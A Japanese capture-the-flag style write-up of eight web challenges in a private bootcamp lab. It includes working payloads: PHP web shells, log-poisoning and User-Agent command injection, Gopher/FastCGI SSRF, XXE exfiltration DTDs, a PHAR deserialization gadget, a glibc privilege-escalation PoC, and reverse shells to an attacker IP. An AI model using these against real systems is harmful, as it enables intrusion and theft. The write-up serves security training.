# Bootcamp Web チャレンジ ライトアップ：10 台のマシン、10 の攻撃経路

`*.edu.stf` ブートキャンプレンジの 10 台の Web セキュリティチャレンジを、初期偵察から完全攻略まで順にまとめた。各チャレンジは異なる種類の脆弱性を対象にしており、各ライトアップには実際に使用したコマンド、思考プロセス、そして落とし穴の場所を記載している。

本ライトアップは、Kali マシンがターゲットサブネット（`10.124.1.0/27`）と同じ VPN 上にあり、`tun0` の IP が `10.127.210.82` であることを前提とする。実際に手を動かす際は、自身のインターフェース IP に置き換えてほしい。

---

## 偵察

まず /27 全体に対して ping スイープを実行する：

```bash
nmap -sn 10.124.1.224/27
```

14 台のホストが応答した。完全なポートスキャンの前に一点注意がある。このレンジは VPN 経由で応答が遅く（おおよそ 340 ms のレイテンシ）、nmap のデフォルトタイミングでは各スキャンが延々と終わらない。選択肢は二つ：

- RustScan を使う場合、バッチサイズを下げ、タイムアウトを上げる：`-b 500 -t 3000`
- nmap を使う場合、RTT とリトライを制限する：

```bash
nmap --initial-rtt-timeout 400ms --max-rtt-timeout 1s --max-retries 1 <targets>
```

理由は、nmap のタイミングヒューリスティクスが高レイテンシリンクを誤読するからだ。パケットがデフォルトのウィンドウ内に戻ってこないと、nmap はポートあたり最大 10 回リトライする。VPN で 300 ms 以上の RTT があると、60 秒で終わるスキャンが 10 分かかる。実測 RTT（`340 ms`）より少し上の初期タイムアウト（`400 ms`）を指定することで、nmap は最初のパケットから「これは遅いリンクだ」と理解し、賢ぶるのをやめる。最大タイムアウトを `1s`、リトライを `1` に制限することで、本当にフィルタされているポートでスキャンが固まるのを防ぐ。

レンジ全体のポートスキャン：

```bash
nmap 10.124.1.225 10.124.1.231 10.124.1.232 10.124.1.234 10.124.1.235 \
     10.124.1.236 10.124.1.237 10.124.1.238 10.124.1.239 10.124.1.240 \
     10.124.1.241 10.124.1.242 10.124.1.253
```

次に、レンジの DNS サーバー経由で逆引きしてホスト名を取得する：

```bash
nmap -sP --dns-servers 10.124.1.240 10.124.1.224/27
```

結果はホスト名とホストの対応を示す：

| IP | ホスト名 | 注目ポート |
|----|----------|-----------|
| 10.124.1.225 | (PTR なし) | 全閉 |
| 10.124.1.231 | aircraft.edu.stf | 22, 80 |
| 10.124.1.232 | calculator.edu.stf | 22, 80, 8080, 8888 |
| 10.124.1.233 | library.edu.stf | 22 |
| 10.124.1.234 | wp.edu.stf | 22, 80 |
| 10.124.1.235 | www.edu.stf | 21, 22, 80 |
| 10.124.1.236 | gallery.edu.stf | 22, 80 |
| 10.124.1.237 | utils.edu.stf | 22, 80 |
| 10.124.1.238 | shop.edu.stf | 22, 80, 9998, 9999 |
| 10.124.1.239 | tokenizer.edu.stf | 22, 80, 5432 |
| 10.124.1.240 | bind.edu.stf | 22, 53 |
| 10.124.1.241 | smashmusic.edu.stf | 22, 80 |
| 10.124.1.242 | test-webserver.edu.stf | 22, 80 |
| 10.124.1.253 | vpn.edu.stf | 443 |

以下の 10 チャレンジは、この 10 台の Web ホストに対応している。

---

## WEB 1 (library.edu.stf) — カーネルチェイサー付きファイルアップロード

初回スキャンではポート 22 のみが表示される。これは「Web」チャレンジとしては妙だ。完全ポートスキャンで確認すると、HTTP はループバックインターフェースのみでリッスンしており、初回スキャンではヒットしなかった。実際の攻撃対象は、ループバックサービスを露出させれば到達可能なファイルアップロードエンドポイントだ。ここで使うツールは `ldd --version` で、これにより `glibc 2.36` が判明する。これは CVE-2023-4911（「Looney Tunables」）の影響を受けるバージョンそのものだ。

アップロードフォームは拡張子で `.png` を受け付けるが、サーバー側で content-type を検証していない。PHP ファイルを `.png` 拡張子でアップロードすると通り、特定のクエリ文字列付きでリクエストすると `text/x-php` としてサーブされる。そこから、小さな PHP ウェブシェルをアップロードして RCE を取得する。

ローカル特権昇格には CVE-2023-4911 を使用する。公開 PoC は GitHub の `looney-tunables-CVE-2023-4911`（hadrian3689 のリポジトリ）。手順：

```bash
# ターゲット側、RCE 後の www-data で
curl -O http://<kali>/gnu-acme.py
chmod +x gnu-acme.py
python3 gnu-acme.py
```

このスクリプトは、システム上の `ld-linux-x86-64.so.2` が既知のビルド ID を持っていることを前提とする。Debian 12 の `glibc 2.36-9+deb12u2` では `35b410ef6ccdab4a7edeb2fdf801b8b65e8d19cc`。ビルド ID が PoC の TARGETS 辞書にない場合、スクリプトは "no target info found" でエラーになる。修正は、ビルド ID を手動で追加すること。ターゲットの `ld-linux` から抽出する：

```bash
python3 -c "
import struct
with open('/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2','rb') as f:
    elf=f.read()
    idx=elf.find(b'GNU\x00')
    if idx>0:
        namesz=struct.unpack_from('<I',elf,idx-12)[0]
        descsz=struct.unpack_from('<I',elf,idx-8)[0]
        ntype=struct.unpack_from('<I',elf,idx-4)[0]
        name=elf[idx:idx+namesz]
        desc=elf[idx+namesz+((4-(namesz%4))%4):idx+namesz+((4-(namesz%4))%4)+descsz]
        if ntype==3 and name[:-1]==b'GNU':
            print('BuildID:', desc.hex())
"
```

続いて PoC にパッチを当てる：

```bash
sed -i 's/TARGETS = {/TARGETS = {\n    "<build_id>": 561,/' gnu-acme.py
```

オフセット値（561）は、glibc の調整されたメモリレイアウトを攻撃者の `GLIBC_TUNABLES` 環境文字列と衝突させる `ld.so` の "adjust" パラメータ。異なる `ld.so` ビルドは異なるオフセットに落ち着く。2.36 系では 561、580、560 が一般的。初期オフセットでポップしなければ、隣接値を試す。

ターゲット上での完全なエクスプロイトフロー：

```bash
chmod +x *
python3 gnu-acme.py
gcc exp.c -o exp
./exp
cd /home
cat flag.txt
```

`exp` が終わった瞬間、`id` は `euid=0` を返す。

**なぜこれが成功したか：** ファイルアップロードバイパスは自明（拡張子チェックのみ、MIME スニッフィングなし）、LPE にはこのボックスが公開される数ヶ月前から存在する CVE を使用した。Looney Tunables は特に `glibc 2.34+` の、`AT_SECURE` が設定される（setuid バイナリ）システムに影響する。したがって、任意の setuid バイナリ — `su`、`passwd`、`mount` さえも — が起動ターゲットとして使える。

---

## WEB 2 (www.edu.stf) — LFI からログポイズニング、そして RCE へ

スキャンで nmap がフラグしなかった 2 つのポートが目立つ：FTP（21）と HTTP（80）。HTTP 側でディレクトリ発見から始める：

```bash
gobuster dir -u http://www.edu.stf/ -w /usr/share/wordlists/dirb/common.txt -k -t 50
gobuster dir -u http://www.edu.stf/api/ -w /usr/share/wordlists/dirb/common.txt -k -t 50 -x php
```

`/api/` ディレクトリには `file` パラメータを受け取る `read.php` エンドポイントがある。LFI をテストする：

```bash
curl "http://www.edu.stf/api/read.php?file=/opt/cpu.txt"
curl "http://www.edu.stf/api/read.php?file=../../../../etc/pt.flag"
```

両方とも内容を返す。LFI 確定。パスにフィルタなし、`open_basedir` 制限なし、`realpath` チェックなし。つまり、`www-data` ユーザーが読めるものなら何でも読める。

面白い角度はログポイズニング。FTP も露出しているからだ。`www-data` として動作するサービスが書き込むログ — `vsftpd.log` を含む — は通常 `www-data` が読める。PHP をログファイルに注入し、LFI 経由でインクルードすれば、ファイルシステムを直接触ることなく RCE を取得できる。

FTP サービスは匿名（このボックスでは、というより任意の）ログインを受け付け、ユーザー名を `vsftpd.log` に記録する。PHP ペイロードをユーザー名としてログインを送信すると、ペイロードがログに書き込まれる：

```bash
lftp -u "<?php system(\$_GET['ci']); ?>,test123" ftp://10.124.1.235
```

`lftp` がない場合の代替：

```bash
echo -e "USER <?php system(\$_GET['ci']); ?>\r\nPASS anything\r\n" | nc -w 3 10.124.1.235 21
```

あるいはインタラクティブ `ftp -n`：

```
ftp -n 10.124.1.235
quote USER <?php system($_GET['ci']); ?>
quote PASS test123
quit
```

これで `vsftpd.log` には次のような行が含まれる：
```
Mon Oct 13 ... [pid 123] CONNECT: Client "..." USER <?php system($_GET['ci']); ?>
```

`read.php` に `file=/var/log/vsftpd.log` を指定すると、PHP の `include()` がログファイルを読み込み、PHP タグを解析して実行する。`ci` GET パラメータがシェルコマンドになる：

```bash
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=id"
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=/home/rceflag"
```

リバースシェルも同じチャネル：

```bash
curl -s "http://www.edu.stf/api/read.php?file=/var/log/vsftpd.log&ci=bash%20-c%20'exec%20bash%20-i%20%3E%26%20/dev/tcp/10.127.210.82/4444%200%3E%261'"
```

LPE については、このボックスは WEB 1 と同じ `glibc` と同じ Looney Tunables 経路を持つ。まず確認：

```bash
ldd --version
uname -a
cat /etc/os-release
```

`glibc` が 2.36 なら、同じ PoC が適用できる。

**なぜこれが成功したか：** LFI にはパス制限が一切なく、8 階層の `..` トラバーサルが成功した。FTP のユーザー名フィールドにはサニタイズがなく、FTP サーバーのログパスは予測可能で、ウェブサーバーユーザーが読めた。この 2 つを組み合わせることで未認証 RCE を取得できる。防ぐべき誤り：ファイルインクルードは `realpath()` とロード可能ディレクトリのホワイトリストを使うべきであり、ユーザー入力の入ったログファイルは実行可能な PHP であってはならない。

---

## WEB 3 (utils.edu.stf) — Gopherus を利用した SSRF と PHP-FPM の RCE

ディレクトリスキャンで、サーバー側で URL を取得する `/convert.php` エンドポイントが見つかる。フォームは URL を受け取り、レンダリング済みのページを返す。これは SSRF 候補であり、サーバー側で使われる `curl` ライブラリは Gopher をサポートしているため、生の TCP への扉が開かれる。

```bash
ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ \
     -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt \
     -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak \
     -fs 1018
```

`file://` スキームが機能する — エンドポイントはローカルファイルを読む。nginx の設定を読む：

```bash
curl -s 'http://10.124.1.237/convert.php?url=file:///etc/nginx/sites-available/default' | head -100
```

設定の重要な 2 行：

```
root /var/www/html;
fastcgi_pass 127.0.0.1:9000;
```

`fastcgi_pass 127.0.0.1:9000` は PHP-FPM が TCP ソケットでリッスンしていることを意味し、Unix ソケットではない。これが落とし穴。PHP-FPM は 9000 で、FastCGI を話しかけると、Nginx が許可していたかどうかに関係なく、指定した任意の PHP ファイルを実行する。

`convert.php` 自体を読む：

```bash
curl -s 'http://10.124.1.237/convert.php?url=file:///var/www/html/convert.php'
```

関連するコード：

```php
$url = $_REQUEST['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
```

スキームのホワイトリストなし。curl は Gopher をサポートしているので、SSRF 経由で Gopher が完全に開いている。Gopher は任意の生 TCP を送れる — FastCGI を `127.0.0.1:9000` と話すのに最適。

Gopherus は FastCGI ペイロードの構築を自動化する：

```bash
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
chmod +x install.sh
./install.sh
```

現代的なマシンでは、`python2` が存在しないとインストーラが失敗する可能性がある。手動インストール：

```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o /tmp/get-pip.py
sudo python2 /tmp/get-pip.py
sudo python2 -m pip install requests
python2 gopherus.py --exploit fastcgi
```

Gopherus は「サーバーに必ず存在するファイル」を要求する — ウェブルート内の任意の PHP ファイルでよく、`convert.php` 自体が明らかな選択肢。実行するコマンドは何でもよく、`/tmp` に完全な PHP ウェブシェルを書き込むことも含む：

```
Terminal command to run: /home/rceflag > /tmp/flag.txt
```

出力は `gopher://` URL。SSRF 経由で送信：

```bash
curl -s -o /dev/null 'http://10.124.1.237/convert.php?url=<gopher_url>'
```

URL に特殊文字がある場合、`curl -G` で URL エンコード：

```bash
curl -G 'http://10.124.1.237/convert.php' --data-urlencode 'url=<gopher_url>'
```

リバースシェルへの RCE も同じチャネル：

```bash
# リバースシェル PHP を書き込む
curl -o /tmp/shell.php http://10.127.210.82:8000/shell.php

# Gopher 経由でトリガー
python2 gopherus.py --exploit fastcgi
# ファイル: /var/www/html/convert.php
# コマンド: php /tmp/shell.php
```

返ってきた gopher URL を `convert.php?url=` に送り、リスナーでリバースシェルをキャッチする。`/usr/share/webshells/php/` の `php-reverse-shell.php` で十分 — 中の IP とポートを変更するだけ。

**なぜこれが成功したか：** サーバーはスキームのホワイトリストも内部アドレスのブロックリストもなく URL を取得した。curl の Gopher サポートはループバックへの生 TCP を可能にした。PHP-FPM が TCP ソケット（Unix ソケットではなく）でリッスンしていたため、FastCGI 攻撃が容易だった。Unix ソケットは異なる gopher ペイロード形式と、知らないかもしれないファイルシステムパスを必要とする。

**修正：** http/https をホワイトリストし、RFC1918 とループバックレンジをブロック、curl ラッパーで Gopher を無効化、PHP-FPM を Unix ソケットの背後に置き、`listen.owner`/`listen.mode` を正しく設定する。

---

## WEB 4 (shop.edu.stf) — 露出した DB ダンプと SQL インジェクション

`http://shop.edu.stf` で `feroxbuster`：

```bash
feroxbuster -u http://shop.edu.stf -s 200 -t 200 --insecure
```

結果セットにこれがある：

```
200  GET  344l  1343w  10727c  http://shop.edu.stf/db/hellophones.sql
```

生の SQL ダンプがウェブルートに置かれている。取得：

```bash
curl http://shop.edu.stf/db/hellophones.sql
```

ダンプには `users` テーブルが含まれ、列は `userid`、`username`、`password`、`role`。3 行：

| userid | username | password | role |
|--------|----------|----------|------|
| 4 | kwizera | 12345 | Manager |
| 5 | nemaroy | 12345 | Seller |
| 6 | irera | 12345 | Seller |

ファイル名の `hellophones` に注意 — このボックスは電話ショップで、SQL ダンプ名は納得感のために選ばれた。典型的なミス：開発者がスキーマをエクスポートし、便宜のために `/db/` に置き、削除しなかった。

`http://shop.edu.stf/index.php` で `kwizera / 12345` を使ってログイン。Manager ロールは商品管理パネルへのアクセスを提供する。

アップロードエンドポイントは `/Execute/ExChangePicture.php`。テスト：

```bash
curl -X POST http://shop.edu.stf/Execute/ExChangePicture.php \
  -b "PHPSESSID=<your_session>" \
  -F "IDUser=4" \
  -F "Image=@shell.php;type=application/octet-stream"
```

サーバーはファイルを `/assets/img/Profile_Uploaded/shell.php` に移動する。拡張子チェックなし、MIME チェックなし、画像サニティチェックなし。パスは決定的（アップロードされたファイル名を直接使う）。呼び出し：

```bash
curl "http://shop.edu.stf/assets/img/Profile_Uploaded/shell.php?rev=id"
```

`www-data` として `id` の出力が返る。

リバースシェル：

```bash
curl "http://shop.edu.stf/assets/img/Profile_Uploaded/shell.php?rev=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.127.210.82/4444%200%3E%261%27"
```

`shell.php` 自体：

```php
<?php echo system($_GET["rev"]); ?>
```

**なぜこれが成功したか：** ウェブルート内のバックアップ SQL ダンプが管理者認証情報を渡した。アップロードハンドラはクライアント提供のファイル名と content-type を信頼し、結果を同じドメインの予測可能な URL から提供した。どちらか一方だけでもボックスを破壊するのに十分。

---

## WEB 5 (tokenizer.edu.stf) — 露出した秘密鍵による JWT 改ざん

ログインページの `check.php` エンドポイントは JWT をデコードし検証する。最初に有効なトークンを渡す：

```bash
curl "http://tokenizer.edu.stf/check.php?jwt=<valid_token>"
```

レスポンスにはデコードされたヘッダーとペイロード、その後にゴミ — このゴミは生の HMAC 署名バイト。ペイロード：

```json
{
  "user": "James",
  "dir": "samples",
  "key": "qwerty",
  "timestamp": 1783860535
}
```

重要なフィールドは 3 つ：
- `user: James` — 身元クレーム
- `dir: samples` — リストされるディレクトリ
- `key: qwerty` — HMAC 秘密鍵、平文、トークンペイロード内

アプリは素朴にも署名鍵をペイロードに入れている。`qwerty` は 5 文字で辞書攻撃の範囲内だが、ここではブルートフォースすら不要 — 鍵は目の前にある。

jwt.io（または PyJWT でローカルに）トークンを再構築：

```python
import jwt, time
token = jwt.encode({
    "user": "admin",
    "dir": "admin",
    "key": "qwerty",
    "timestamp": int(time.time()) + 3600
}, "qwerty", algorithm="HS256")
print(token)
```

`dir` フィールドが重要。サーバーは `dir` 内のディレクトリからファイルをリストする。`admin`（または `.` でアプリのルート）を設定すると、別のファイルが露出する。偽造トークンを送る：

```bash
curl "http://tokenizer.edu.stf/check.php?jwt=<forged_token>"
```

レスポンスにリストされる：

```
samples
composer.json
vendor
token.php
index.html
supersecretadminloginyoullneverguess.php
composer.lock
..
check.php
.
```

面白い名前が 2 つ：`token.php`（おそらくトークン生成ロジック）と、ふざけた名前の管理者ログイン。両方取得：

```bash
curl "http://tokenizer.edu.stf/supersecretadminloginyoullneverguess.php"
```

管理者ログインページはフォーム POST を受け付ける。`admin:admin` でログインすると成功し、管理者パネルは SQL インジェクションに対して脆弱な検索インターフェースを露出する。

インジェクションには、Burp でリクエストをキャプチャするか手動で構築：

```
POST /supersecretadminloginyoullneverguess.php HTTP/1.1
Host: tokenizer.edu.stf
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<your_session>
Connection: keep-alive

name=1&address=1&phone=1&email=1&plan=1&submit_search=Submit
```

`/tmp/pack` に保存し、sqlmap を実行：

```bash
sqlmap -r pack --level=5 --risk=3 --dbms=postgresql -p phone --dbs --batch --random-agent
```

DBMS は PostgreSQL（初回スキャンのポート 5432 で確認済み）。データベース：

```
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

`public` のテーブル：

```bash
sqlmap -r pack --level=5 --risk=3 --tables -D public --batch --random-agent
```

```
+--------------+
| clients_data |
| secret       |
+--------------+
```

`secret` の列：

```bash
sqlmap -r pack --level=5 --risk=3 --columns -D public -T secret --batch --random-agent
```

```
+--------+--------+
| Column | Type   |
+--------+--------+
| flag   | bpchar |
| id     | int4   |
+--------+--------+
```

ダンプ：

```bash
sqlmap -r pack --level=5 --risk=3 --dump -D public -T secret --batch --random-agent
```

**なぜこれが成功したか：** 3 つの独立した問題が積み重なった。署名秘密鍵がトークンペイロードに埋め込まれ、偽造が自明だった。`dir` パラメータがディレクトリパスとしてサーバー側で検証なしに使われ、隠しファイルを露出した。管理者パネルの検索フォームはパラメータ化されておらず、PostgreSQL バックエンドに対してスタック SQL クエリを許可した。

**修正：** 署名秘密鍵をトークンに入れない、パラメータ化クエリを使う、管理者パネルを第二要素認証の背後に置く。

---

## WEB 6 (smashmusic.edu.stf) — ハードコードされた鍵による認証バイパス

ディレクトリスキャン：

```bash
gobuster dir -u http://10.124.1.241/ -w /usr/share/wordlists/dirb/common.txt -k -t 50 -x php,html,pdf,js
```

注目すべきパス：`/phpmyadmin`、`/secret/`、`/uploads/`、`/core/`、`/vendor/`。`/uploads/` はファイルを受け付け、`/secret/` は管理者エリア。

`/uploads/sh.phtml` は既に存在する（以前のテスターか、準備された環境から）。テスト：

```bash
curl "http://10.124.1.241/uploads/sh.phtml?cmd=id"
```

`www-data` を返す。誰かが落としたウェブシェル。動作原理を理解するため、`/core/authenticate.php` を読む：

```bash
curl "http://10.124.1.241/uploads/sh.phtml?cmd=cat+/var/www/html/core/authenticate.php"
```

関連する行：

```php
private $key = 'hetfield_';
```

ハードコードされた JWT 署名鍵。これで有効な管理者トークンを偽造できる。`/js/auth.js` を読んでログインフローを確認：

```javascript
url: "core/userLogin.php",
type: "POST",
contentType: "application/json",
data: datas,
...
Cookies.set("jwt", result, 0);
$(location).attr('href','secret/secretPanel.php');
```

ログインエンドポイントは `username` と `password` を含む JSON を期待する。JWT は `jwt` という名前のクッキーに保存される。ログイン後のリダイレクトは `secret/secretPanel.php`。

Hydra でログインをブルートフォース：

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.1.241 http-post-form \
  "/core/userLogin.php:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:eyJ" \
  -t 30
```

`:eyJ` は失敗文字列検索：`eyJ` を含むレスポンスは有効な JWT が返ってきたことを意味する。認証情報：`admin:123456`。

ログインは `hetfield_` で署名された JWT を返す。直接偽造もできる：

```python
import jwt, time
token = jwt.encode({
    "name": "admin",
    "email": "admin@musick.com",
    "iss": "localhost",
    "aud": "localhost",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400
}, "hetfield_", algorithm="HS256")
```

管理者パネルに送信：

```bash
curl -b "jwt=<token>" http://10.124.1.241/secret/secretPanel.php
```

パネルには `secret/uploadMusic.php` のアップロードフォームがある。アップロードは `.phtml` ファイルを受け付ける：

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

curl -X POST http://10.124.1.241/secret/uploadMusic.php \
  -H "Cookie: jwt=<token>" \
  -F "userfile=@shell.phtml;type=audio/mpeg" \
  -F "upload_btn=Upload"
```

トリガー：

```bash
curl "http://10.124.1.241/uploads/shell.phtml?cmd=id"
curl "http://10.124.1.241/uploads/shell.phtml?cmd=/home/rceflag"
```

**なぜこれが成功したか：** アプリは明らかに急いで作られた — JWT 秘密鍵が `authenticate.php` にハードコードされ、アップロードハンドラは `.phtml` を通した（Apache は `mod_php` がロードされていれば `.phtml` を PHP として解釈する）。`admin:123456` のデフォルトも助けにならない。

---

## WEB 7 (test-webserver.edu.stf) — XXE から User-Agent インジェクション経由の RCE

ボックスはリクエストボディの XML を解析する単一のエンドポイントを提供する。アプリ自身の README を読むと意図された経路が示唆される：

```bash
curl -s http://10.124.1.242/README.md
```

ファイルは 1 行を含む：`libxml_disable_entity_loader`。これは PHP 関数。アプリがそれを呼んでいないというヒントであり、外部エンティティがデフォルトで有効であることを意味する。XXE はオン。

最初に interactsh で OOB を確認：

```bash
interactsh-client
```

`d9bhc62o12pi2daaije0d7szq86ntamfy.oast.live` のようなドメインが得られる。それへの外部エンティティを含むペイロードを送る：

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/xml
Content-Length: 144
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://d9bhc62o12pi2daaije0d7szq86ntamfy.oast.live/test">
]>
<test>&xxe;</test>
```

Interactsh が DNS と HTTP ヒットを示す。Blind XXE 確定。

ファイル漏洩には、Kali ボックスで悪意ある DTD をホスト：

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.127.210.82/?f=%file;'>">
%eval;
EOF
cd /tmp && python3 -m http.server 80
```

`php://filter/convert.base64-encode` ラッパーは PHP にファイル内容を漏洩前に base64 エンコードさせる — 生の `/etc/passwd` はスペースと改行を含み、XML を壊すため必要。

DTD を指す XXE ペイロードを送る：

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/xml
Content-Length: 146
Connection: close

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://10.127.210.82/evil.dtd">
  %remote;
  %exfil;
]>
<test>hello</test>
```

HTTP サーバーがログする：

```
GET /?f=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4K... HTTP/1.0
```

`base64 -d` でデコードして `/etc/passwd` を取得。

同じ方法でアプリケーションソースを読む：

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.127.210.82/?f=%file;'>">
%eval;
EOF
```

デコードされたソースに含まれる：

```php
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
...
$user_agent = $_SERVER['HTTP_USER_AGENT'];
exec("echo '".$user_agent."' | grep Firefox", $output, $return);
```

1 ファイルに 2 つの問題：
1. `LIBXML_NOENT | LIBXML_DTDLOAD` が外部エンティティ解決を有効化
2. `exec("echo '".$user_agent."' | grep Firefox")` — User-Agent ヘッダーをシェルコマンドに直接文字列補間

`User-Agent` フィールドがインジェクション可能。送信：

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: '; curl http://10.127.210.82/?rce=$(whoami|base64); '
Content-Type: application/xml
Content-Length: 47
Connection: close

<?xml version="1.0"?>
<test>hello</test>
```

実行されるコマンドは：

```
echo '' ; curl http://10.127.210.82/?rce=$(whoami|base64); '' | grep Firefox
```

`curl` を実行し、`whoami` を base64 経由でクエリパラメータとしてパイプする。Kali HTTP サーバーがリクエストをログ：

```
GET /?rce=d3d3LWRhdGEK HTTP/1.0
```

`d3d3LWRhdGEK` をデコード → `www-data`。RCE 確定。

リバースシェル：

```
POST / HTTP/1.1
Host: 10.124.1.242
User-Agent: '; bash -c "bash -i >& /dev/tcp/10.127.210.82/4444 0>&1"; '
Content-Type: application/xml
Content-Length: 47
Connection: close

<?xml version="1.0"?>
<test>hello</test>
```

キャッチする：

```bash
nc -lvnp 4444
```

**なぜこれが成功したか：** 同じファイルに 2 つのバグ。`libxml_disable_entity_loader(false)` が XXE を開き、`exec("echo '".$user_agent."'")` がヘッダー経由のコマンドインジェクションを与える。どちらか一方だけでも十分。XXE 単独はファイル読み取り、コマンドインジェクション単独は `www-data` として RCE。

---

## WEB 8 (gallery.edu.stf) — URL アップロード経由の PHAR デシリアライゼーション

2 つの PHP エンドポイントを `curl` しても 200 だが空ボディ、なので別の方法でソースを取り戻す必要がある。`/ajax.php` エンドポイントは `action` パラメータと `imageURL` パラメータを受け付ける。テスト：

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=../../../etc/passwd"
```

`/images/c542155ebe0034790afc9c47390fbe802cf823.txt` のようなパスを返す — ファイル内容の MD5 ハッシュとランダムプレフィックス。アプリは取得した URL 内容を `images/` にコピーするので、任意ファイル書き込みがある。

アプリのソースを読む：

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=./classes.php"
```

レスポンスに `classes.php` の内容が含まれる。2 つのファイルが重要：

**`classes.php`** には `__destruct` を持つクラスがある：

```php
class ImageSorting {
    public $ImageArr;
    public $SortFunc;

    function __destruct() {
        usort($this->ImageArr, $this->SortFunc);
    }
}
```

制御可能なコールバックを持つ `usort()` は古典的なガジェット：`usort(["id"], "system")` は `system("id")` を呼ぶ。`__destruct` はオブジェクトがスコープ外に出ると発火する。

**`ajax.php`** にはアップロードハンドラがある：

```php
array_push($uploAdsArr, Array($files[$i2], filemtime('./images/'.$files[$i2])));
```

**`classes.php`** には以下もある：

```php
copy($this->ImageUrl, $_SERVER["DOCUMENT_ROOT"].$ImageName);
```

`copy($this->ImageUrl, ...)` は任意のストリームラッパーを受け付ける。`phar://` はラッパー。そして `phar://` パスへの任意のファイル操作 — `file_exists` や `md5_file` さえも — が PHAR のメタデータセクションのデシリアライゼーションをトリガーする。

これが完全なチェーン：
1. `ImageSorting` をメタデータとして持つ PHAR をビルド
2. `imageURL=http://kali/exploit.phar` でアップロード
3. `imageURL=phar://./images/<hash>.txt` でデシリアライゼーションをトリガー

Kali で PHAR をビルド：

```bash
cat > /tmp/create_phar.php << 'EOF'
<?php
class ImageSorting {
    public $ImageArr = Array();
    public $SortFunc = "system";
}
$payload = new ImageSorting();
$payload->ImageArr = ["id", "x"];
$payload->SortFunc = "system";
@unlink("exploit.phar");
$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($payload);
$phar->stopBuffering();
echo "[+] exploit.phar created\n";
EOF

php -d phar.readonly=0 /tmp/create_phar.php
```

`phar.readonly=0` が必要。PHP は `phar.readonly` がオン（デフォルト）だと PHAR アーカイブの作成を拒否する。

サーブする：

```bash
cd /tmp && python3 -m http.server 80
```

ターゲット側からアップロード：

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=http://10.127.210.82/exploit.phar"
```

レスポンスにコピーされたパス、例：`/images/abc123def456.txt` が含まれる。トリガー：

```bash
curl -X POST http://10.124.1.236/ajax.php -d "action=uploadImage&imageURL=phar://./images/abc123def456.txt"
```

`copy()` または `md5_file()`（どちらか先に発火する方）が `phar://` ラッパーに触れた瞬間、PHP はメタデータを `ImageSorting` オブジェクトにデシリアライズする。オブジェクトがリクエスト終了時に GC されると、`__destruct` が `usort(["id", "x"], "system")` を実行し、`system("id")` を呼ぶ。

完全なリバースシェルには：

```bash
cat > /tmp/create_phar2.php << 'EOF'
<?php
class ImageSorting {
    public $ImageArr = Array();
    public $SortFunc = "system";
}
$ip = "10.127.210.82";
$port = "4444";
$cmd = "bash -c 'exec bash -i &>/dev/tcp/{$ip}/{$port} <&1'";
$payload = new ImageSorting();
$payload->ImageArr = [$cmd, "x"];
$payload->SortFunc = "system";
@unlink("exploit2.phar");
$phar = new Phar("exploit2.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setMetadata($payload);
$phar->stopBuffering();
EOF

php -d phar.readonly=0 /tmp/create_phar2.php
```

アップロードとトリガーの手順は同一 — `exploit.phar` を `exploit2.phar` に置き換えるだけ。

**なぜこれが成功したか：** 「ユーザー制御のファイルパスを `copy()` に渡す」と「制御可能なコールバックを持つ `__destruct` ガジェットクラス」の組み合わせ。PHAR デシリアライゼーションは特に厄介。通常の `unserialize()` 監査証跡をバイパスする — `phar://` URI への任意のファイル操作がメタデータをデシリアライズする、`file_exists` のような無害に見えるものでさえ。

